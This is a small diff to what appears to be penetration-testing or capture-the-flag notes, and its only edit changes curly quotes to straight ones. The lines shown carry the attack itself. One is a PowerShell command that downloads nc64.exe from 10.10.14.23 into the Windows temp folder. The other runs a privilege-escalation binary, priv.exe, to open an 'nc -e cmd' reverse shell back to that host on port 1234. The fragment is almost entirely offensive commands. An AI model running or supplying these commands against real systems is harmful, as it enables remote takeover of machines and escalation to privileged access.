@@ -183,7 +183,7 @@ Transfert64bit nc
 New-Object Net.WebClient).DownloadFile(‘http://10.10.14.23/nc64.exe’,’c:\windows\temp\nc.exe‘
 
 Exploit
-/priv.exe “c:\windows\temp\nc.exe -e cmd 10.10.14.23 1234”
+/priv.exe "c:\windows\temp\nc.exe -e cmd 10.10.14.23 1234"
 
 
 
